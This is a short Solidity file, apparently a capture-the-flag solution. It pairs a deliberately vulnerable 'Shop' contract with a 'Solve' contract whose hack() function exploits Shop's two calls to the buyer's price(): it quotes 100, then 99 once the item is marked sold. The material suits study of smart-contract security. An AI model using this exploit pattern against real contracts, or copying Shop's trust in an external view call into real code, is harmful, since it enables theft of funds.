// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solve {
  Shop private immutable target;

  constructor(address _target) {
    target = Shop(_target);
  }

  function hack() external {
    target.buy();
    require(target.price() == 99, "price != 99");
  }

  function price() external view returns (uint) {
    if (target.isSold()) {
      return 99;
    }
    return 100;
  }
}

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}